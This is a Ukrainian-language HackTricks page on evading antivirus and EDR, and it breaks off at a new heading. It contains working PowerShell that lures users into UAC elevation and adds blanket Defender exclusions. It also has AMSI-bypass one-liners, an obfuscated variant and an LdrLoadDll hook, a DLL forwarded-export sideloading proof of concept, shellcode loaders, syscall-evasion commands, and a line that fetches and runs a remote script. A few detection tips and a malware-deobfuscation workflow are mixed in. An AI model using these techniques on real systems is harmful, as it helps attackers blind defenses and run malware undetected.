# Обхід антивіруса (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, який імітує інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка з інсталятором UAC перед втручанням у роботу Defender

Загальнодоступні лоадери, що видають себе за чіти для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спершу **запитують у користувача підвищення привілеїв**, а лише потім виводять Defender з ладу. Послідовність проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише тоді, коли викликач має права адміністратора, тому помилка означає, що лоадер запущено від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуване вікно підтвердження UAC, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «cracked»-програмне забезпечення, тож зазвичай погоджуються із запитом, надаючи malware права, потрібні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Масові виключення `MpPreference` для кожної літери диска

Отримавши підвищені привілеї, ланцюжки на кшталт GachiLoader не вимикають службу повністю, а максимально збільшують кількість сліпих зон Defender. Спочатку loader завершує роботу GUI-наглядача (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб скануванню не підлягали кожен профіль користувача, системний каталог і знімний диск:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл проходить по кожній підключеній файловій системі (D:\, E:\, USB-накопичувачі тощо), тому **будь-яке майбутнє корисне навантаження, розміщене будь-де на диску, ігноруватиметься**.
- Виключення файлів із розширенням `.sys` зроблено з прицілом на майбутнє — зловмисники залишають за собою можливість пізніше завантажувати непідписані драйвери, не змінюючи більше нічого в Defender.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу на наступних етапах перевірити, чи збереглися виключення, або розширити їх, не викликаючи UAC повторно.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану й надалі повідомляють, що «антивірус активний», хоча перевірка в реальному часі фактично не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Наразі AV використовують різні методи перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз, а в просунутіших EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або послідовностей байтів у бінарному файлі чи скрипті, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих загальнодоступних інструментів може швидше призвести до виявлення, адже їх, імовірно, уже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати й запустити програму в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб обійти AV, але це може забрати багато часу — залежно від того, що саме ви намагаєтеся обфускувати.

- **Власні інструменти**

Якщо розробити власні інструменти, для них не буде відомих шкідливих сигнатур, але це потребує багато часу й зусиль.

> [!TIP]
> Щоб перевірити файл на статичне виявлення Windows Defender, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на сегменти й доручає Defender сканувати кожен окремо. Так можна точно визначити, які рядки або байти у вашому бінарному файлі позначаються як шкідливі.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з браузера, створити minidump LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька способів обходити sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox в AV можуть просто пропускати затримку — залежно від її реалізації.
- **Перевірка ресурсів комп’ютера** Зазвичай у sandbox дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б сповільнити комп’ютер користувача. Тут можна проявити креативність: наприклад, перевіряти температуру CPU чи навіть швидкість обертання вентиляторів — у sandbox реалізовано не все.
- **Перевірки, специфічні для комп’ютера** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо домен не збігається, програма може завершити роботу.

Виявляється, ім’я комп’ютера в Microsoft Defender Sandbox — HAL9TH. Тож перед запуском можна перевірити ім’я комп’ютера у вашому malware: якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо обходу sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій публікації, **загальнодоступні інструменти** рано чи пізно **починають виявлятися**, тож варто поставити собі запитання:

Наприклад, якщо вам потрібно створити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який теж створює дамп LSASS?

Імовірно, правильна відповідь — другий варіант. Візьмімо mimikatz: це, мабуть, один із найбільш позначених AV та EDR шкідливих інструментів, якщо не найбільш позначений. Сам проєкт дуже крутий, але обійти з його допомогою AV — справжній кошмар, тож просто шукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Змінюючи корисне навантаження для обходу виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛ НА VIRUSTOTAL**, якщо хочете, щоб обхід виявлення залишався ефективним у довгостроковій перспективі. Якщо потрібно перевірити, чи виявляє ваше корисне навантаження певний AV, встановіть його у VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Якщо є така можливість, для обходу виявлення завжди **віддавайте перевагу DLL**. З мого досвіду, файли DLL зазвичай **виявляють і аналізують набагато рідше**, тож у деяких випадках це простий спосіб уникнути виявлення (звісно, якщо ваше корисне навантаження можна запустити як DLL).

Як видно на цьому зображенні, рівень виявлення DLL Payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload і звичайного Havoc DLL</p></figcaption></figure>

Тепер розглянемо кілька прийомів роботи з файлами DLL, які допоможуть стати значно непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи вразливу програму та шкідливе корисне навантаження поруч.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) і такого скрипта PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\" і DLL-файлів, які вони намагаються завантажити та які вразливі до DLL hijacking.

Я дуже рекомендую самостійно **дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко виявити.

Просте розміщення шкідливої DLL з назвою, яку очікує завантажити програма, не призведе до завантаження вашого payload, оскільки програма очікує наявності в цій DLL певних функцій. Щоб розв’язати цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма робить із проксі (і шкідливої) DLL до оригінальної DLL, зберігаючи таким чином функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, які я виконав:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і перейменовану оригінальну DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають Detection rate 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Дуже рекомендую** переглянути [VOD зі стриму S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про обговорене.

### Abusing Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість вказівника на код запис експорту містить рядок ASCII у форматі `TargetDll.TargetFunc`. Коли викликач шукає цей експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Шукає в ньому `TargetFunc`

Важливо розуміти таку поведінку:
- Якщо `TargetDll` є KnownDLL, його завантажують із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який охоплює каталог модуля, що виконує переспрямування.

Це дає змогу використати примітив непрямого sideloading: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з назвою, що не є KnownDLL, а потім розмістити поруч із цією підписаною DLL контрольовану зловмисником DLL з точно такою самою назвою, як у цільового модуля. Коли буде викликано переспрямований експорт, завантажувач обробить переспрямування та завантажить вашу DLL із того самого каталогу, виконавши ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому пошук відбувається у звичайному порядку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки, доступної для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної `DllMain`; щоб викликати `DllMain`, реалізовувати функцію-переадресацію не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за форвардом до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після того, як `DllMain` уже виконався

Поради з пошуку:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перелічити forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте перелік форвардерів Windows 11, щоб знайти потенційні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї щодо виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із нестандартних системних шляхів, а потім завантажують із тієї самої директорії DLL, що не належать до KnownDLLs, але мають таку саму базову назву
- Сповіщайте про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

За допомогою Freeze можна непомітно завантажувати та виконувати shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити, тож ніколи не покладайтеся лише на один інструмент і, якщо можливо, спробуйте поєднувати кілька технік evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR часто встановлюють **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до export в `ntdll`).
- **Indirect**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби він починається в `ntdll` (корисно для evasion на основі евристик); **randomized indirect** вибирає gadget із пулу під час кожного виклику.
- **Egg-hunt**: уникати вбудовування статичної послідовності opcode `0F 05` на диску; знаходити syscall sequence під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальною адресою, а не зчитуючи байти stub.
- **SyscallsFromDisk**: відобразити чистий `\KnownDlls\ntdll.dll`, зчитати SSN із його `.text`, а потім скасувати відображення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN за сортуванням VA з перевіркою opcode, якщо stub чистий; якщо він hooked — перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не розбираючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якби вам вдалося виконати payloads **безпосередньо в пам’яті**, AV не змогли б цьому завадити, оскільки не мали достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне виконання коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Вона дає антивірусним рішенням змогу перевіряти поведінку скриптів, надаючи вміст скриптів у незашифрованому та необфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що перед шляхом до виконуваного файла, з якого запущено скрипт, додається `amsi:`. У цьому випадку це powershell.exe.

Ми не записували жодного файла на диск, але все одно спрацювало виявлення в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це стосується навіть `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Тому для виконання в пам’яті, якщо потрібно обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або старіші).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно спирається на статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI може зняти обфускацію зі скриптів, навіть якщо вони мають кілька рівнів, тому обфускація може бути невдалим варіантом — залежно від способу її застосування. Через це обхід не такий простий. Втім, іноді достатньо змінити кілька назв змінних — усе залежить від того, наскільки щось позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її можна легко підмінити, навіть працюючи без привілеїв. Через цей недолік реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Примусове виникнення помилки**

Якщо змусити ініціалізацію AMSI завершитися помилкою (amsiInitFailed), сканування поточного процесу не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти ширшому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Щоб зробити AMSI непридатним до використання в поточному процесі PowerShell, вистачило одного рядка коду PowerShell. Звісно, цей рядок уже виявляє сам AMSI, тож для використання цієї техніки потрібні певні зміни.

Ось модифікований AMSI bypass, який я взяв із цього [GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Майте на увазі: щойно ця публікація вийде, її, імовірно, позначать, тож не публікуйте жодного коду, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в тому, щоб знайти адресу функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезаписати її інструкціями, що повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування буде 0, що інтерпретується як безпечний результат.

> [!TIP]
> Ознайомтеся з [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) і в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, полягає у встановленні hook у просторі користувача на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і сканування в цьому процесі не відбувається.<sup>[[23]](#references)</sup>

Опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і custom loaders (усім, що зазвичай завантажує AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувався в loaders, запущених через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає signature завдяки рандомізованим визначеним користувачем функціям, змінним, виразам із символами та випадковому регістру символів у ключових словах PowerShell.

**Видаліть виявлену signature**

Щоб видалити виявлену AMSI signature з пам’яті поточного процесу, можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу на наявність AMSI signature, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Зробіть так:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисно для аудиту та усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими техніками:

- **Вимкнути транскрипцію PowerShell і журналювання модулів**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (такий підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, журналювання блоків скриптів чи інші засоби захисту PowerShell; обсяг покриття залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі техніки обфускації покладаються на шифрування даних, що збільшить ентропію бінарного файла й полегшить його виявлення засобами AV та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до окремих частин коду, які є чутливими або які потрібно приховати.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори та пісочниці. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від підміни – ConfuserEx шифрує кожне *тіло методу* й розшифровує його у статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тож будь-яка модифікація призведе до аварійного завершення бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити ключі XOR і перезаписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / control-flow – передайте *clean* файл до **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує control-flow flattening, відновить оригінальні простори імен, класи й назви змінних та розшифрує рядки-константи.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легковагими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy, знайдіть великі блоки Base64 або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб виявити *справжнє* корисне навантаження. Часто malware зберігає його як байтовий масив у форматі TLV, ініціалізований усередині `<Module>.byte_0`.

Описаний вище ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на автономній робочій станції.

> 🛈  ConfuserEx створює спеціальний атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного первинного аналізу зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк набору компіляції [LLVM](http://www.llvm.org/), здатний підвищити безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від втручання.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14`, щоб генерувати обфускований код під час компіляції без зовнішніх інструментів і модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, здатний обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, що підтримуються LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Маскування окремих функцій за допомогою компілятора LLVM

